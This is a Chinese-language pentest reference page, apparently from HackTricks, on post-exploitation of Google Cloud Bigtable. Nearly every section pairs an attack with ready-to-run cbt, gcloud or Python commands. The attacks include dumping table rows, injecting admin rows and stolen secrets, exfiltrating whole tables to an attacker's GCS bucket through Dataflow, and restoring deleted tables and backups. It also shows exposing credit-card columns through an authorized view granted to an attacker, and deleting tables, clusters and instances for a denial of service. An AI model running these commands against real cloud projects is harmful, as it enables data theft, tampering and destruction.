# GCP - Bigtable 后期利用

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

有关 Bigtable 的更多信息请查看：

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> 通过 Cloud SDK 安装一次 `cbt` CLI，以便下面的命令可在本地运行：
>
> <details>
>
> <summary>Install cbt CLI</summary>
>
> ```bash
> gcloud components install cbt
> ```
>
> </details>

### 读取行

**权限：** `bigtable.tables.readRows`

`cbt` 随 Cloud SDK 一起提供，并可以直接与 admin/data APIs 通信，无需任何中间件。将其指向被攻陷的 project/instance，并直接从表中导出行。如果只想简单查看，请限制扫描范围。

<details>

<summary>读取 Bigtable 条目</summary>
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
</details>

### 写入行

**权限:** `bigtable.tables.mutateRows`（确认更改需要 `bigtable.tables.readRows`）。

使用相同的工具 upsert 任意 cells。这是实现 backdoor configs、drop web shells 或 plant poisoned dataset rows 的最快方法。

<details>

<summary>注入恶意行</summary>
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
</details>

`cbt set` 接受通过 `@/path` 语法传入的原始字节，因此你可以按下游服务预期的方式推送已编译的 payloads 或序列化的 protobufs。

### 将行导出到你的 bucket

**权限：** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

可以通过启动一个 Dataflow job，将行流式写入你控制的 GCS bucket，从而将整个表的内容 exfiltrate 到你控制的 bucket。

> [!NOTE]
> 请注意，您需要对某个具有足够权限执行导出的 SA 拥有 `iam.serviceAccounts.actAs` 权限（默认情况下，如果未另行指明，将使用默认 compute SA）。

<details>

<summary>将 Bigtable 导出到 GCS bucket</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

> [!NOTE]
> 如果你希望输出为 Parquet/SequenceFile 而不是 JSON，请将模板切换为 `Cloud_Bigtable_to_GCS_Parquet` 或 `Cloud_Bigtable_to_GCS_SequenceFile`。权限相同；仅模板路径会改变。

### 导入行

**权限：** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

可以通过启动一个 Dataflow 作业，将行流式写入你控制的 GCS bucket，从而从攻击者控制的 bucket 导入整个表的内容。为此，攻击者首先需要创建一个符合预期 schema 的 parquet 文件，包含要导入的数据。攻击者可以先使用前述技术并选择 `Cloud_Bigtable_to_GCS_Parquet` 设置将数据导出为 parquet 格式，然后在下载的 parquet 文件中添加新条目。



> [!NOTE]
> 注意，你需要对具有足够权限来执行导出的某个 SA 拥有 `iam.serviceAccounts.actAs` 权限（默认情况下，如果未另行指定，将使用默认的 compute SA）。

<details>

<summary>从 GCS bucket 导入到 Bigtable</summary>
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

### 恢复备份

**权限：** `bigtable.backups.restore`, `bigtable.tables.create`.

具有这些权限的攻击者可以将备份恢复到其控制的新表，从而能够恢复旧的敏感数据。

<details>

<summary>恢复 Bigtable 备份</summary>
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
</details>

### 恢复已删除的表

**权限：** `bigtable.tables.undelete`

Bigtable 支持带有宽限期（通常默认 7 天）的软删除。在此窗口期内，拥有 `bigtable.tables.undelete` 权限的攻击者可以恢复最近删除的表并恢复其所有数据，可能访问被认为已销毁的敏感信息。

这尤其可用于：
- 从在事件响应期间被防御者删除的表中恢复数据
- 访问已被有意清除的历史数据
- 撤销意外或恶意删除以维持持久性

<details>

<summary>恢复 Bigtable 表</summary>
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
</details>

> [!NOTE]
> 撤销删除操作仅在配置的保留期内有效（默认 7 天）。在此窗口期过后，表及其数据将被永久删除，无法通过此方法恢复。


### 创建授权视图

**权限：** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

授权视图允许你呈现表的精心筛选子集。与仅遵循最小权限不同，使用它们来发布你关心的**确切敏感列/行集合**并将你自己的主体列入白名单。

> [!WARNING]
> 问题在于，要创建授权视图，你还需要能够读取并修改基础表的行，因此你并没有获得任何额外权限，因而该技术在大多数情况下几乎无用。

<details>

<summary>创建授权视图</summary>
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
</details>

因为访问被限定在视图范围内，防御方往往忽略你实际上刚创建了一个新的高敏感性端点。

### 读取授权视图

**权限：** `bigtable.authorizedViews.readRows`

如果你有权访问一个授权视图，可以在读取请求中通过指定该授权视图名称，使用 Bigtable 客户端库从中读取数据。注意，该授权视图可能会限制你可以从表中访问的内容。下面是使用 Python 的示例：

<details>

<summary>从授权视图读取 (Python)</summary>
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
</details>

### Denial of Service via Delete Operations

**权限：** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

任何 Bigtable 的 delete 权限都可以被武器化用于 denial of service 攻击。拥有这些权限的攻击者可以通过删除关键的 Bigtable 资源来破坏操作：

- **`bigtable.appProfiles.delete`**：删除应用配置文件，导致客户端连接和路由配置中断
- **`bigtable.authorizedViews.delete`**：移除授权视图，切断应用的合法访问路径
- **`bigtable.authorizedViews.deleteTagBinding`**：从授权视图中移除标签绑定
- **`bigtable.backups.delete`**：销毁备份快照，消除灾难恢复选项
- **`bigtable.clusters.delete`**：删除整个集群，导致数据立即不可用
- **`bigtable.instances.delete`**：删除整个 Bigtable 实例，清除所有表和配置
- **`bigtable.tables.delete`**：删除单个表，导致数据丢失和应用故障

<details>

<summary>删除 Bigtable 资源</summary>
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
</details>

> [!WARNING]
> 删除操作通常是立即且不可逆的。在测试这些命令之前请确保已有备份，因为它们可能导致永久性的数据丢失和严重的服务中断。

{{#include ../../../banners/hacktricks-training.md}}
